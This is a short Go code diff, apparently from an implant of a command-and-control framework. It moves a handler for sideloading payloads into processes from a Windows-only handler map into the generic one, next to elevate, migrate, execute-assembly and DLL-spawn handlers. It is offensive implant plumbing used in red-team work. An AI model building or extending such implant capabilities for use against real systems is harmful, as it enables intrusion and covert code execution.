@@ -44,7 +44,6 @@ var (
 		pb.MsgElevateReq:         elevateHandler,
 		pb.MsgExecuteAssemblyReq: executeAssemblyHandler,
 		pb.MsgMigrateReq:         migrateHandler,
-		pb.MsgSideloadReq:        sideloadHandler,
 		pb.MsgSpawnDllReq:        spawnDllHandler,
 
 		// Generic
@@ -60,6 +59,7 @@ var (
 		pb.MsgMkdirReq:    mkdirHandler,
 		pb.MsgIfconfigReq: ifconfigHandler,
 		pb.MsgExecuteReq:  executeHandler,
+		pb.MsgSideloadReq: sideloadHandler,
 		pb.MsgNetstatReq:  netstatHandler,
 	}
 )
@@ -230,32 +230,6 @@ func migrateHandler(data []byte, resp RPCResponse) {
 	}
 	data, err = proto.Marshal(migrateResp)
 	resp(data, err)
-}
-
-func sideloadHandler(data []byte, resp RPCResponse) {
-	//{{if .Debug}}
-	log.Println("sideloadHandler called")
-	//{{end}}
-	sideloadReq := &pb.SideloadReq{}
-	err := proto.Unmarshal(data, sideloadReq)
-	if err != nil {
-		// {{if .Debug}}
-		log.Printf("error decoding message: %v", err)
-		// {{end}}
-		return
-	}
-	result, err := taskrunner.Sideload(sideloadReq.ProcName, sideloadReq.Data)
-	errStr := ""
-	if err != nil {
-		errStr = err.Error()
-	}
-	sideloadResp := &pb.Sideload{
-		Result: result,
-		Error:  errStr,
-	}
-	data, err = proto.Marshal(sideloadResp)
-	resp(data, err)
-
 }
 
 func spawnDllHandler(data []byte, resp RPCResponse) {
